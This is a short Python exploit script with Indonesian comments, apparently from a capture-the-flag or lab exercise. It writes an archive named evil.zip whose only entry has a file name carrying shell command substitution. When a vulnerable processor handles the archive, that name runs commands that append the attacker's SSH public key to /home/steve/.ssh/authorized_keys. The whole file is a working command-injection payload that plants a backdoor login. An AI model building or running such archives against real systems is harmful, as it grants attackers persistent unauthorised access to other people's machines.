# make_evil_zip.py
import zipfile

# Baca public key dari file hasil ssh-keygen
with open("steve_key.pub", "r") as f:
    pub_key = f.read().strip()

# Nama file berbahaya — command substitution yang dieksekusi saat ZIP diproses
evil_filename = (
    f"$(mkdir -p /home/steve/.ssh && "
    f"echo '{pub_key}' >> /home/steve/.ssh/authorized_keys).ttf"
)

# Buat ZIP langsung via Python tanpa menyentuh filesystem lokal
with zipfile.ZipFile("evil.zip", "w", compression=zipfile.ZIP_DEFLATED) as zf:
    zf.writestr(evil_filename, "")

print(f"[+] evil.zip berhasil dibuat")
print(f"[+] Entry: {evil_filename[:72]}...")
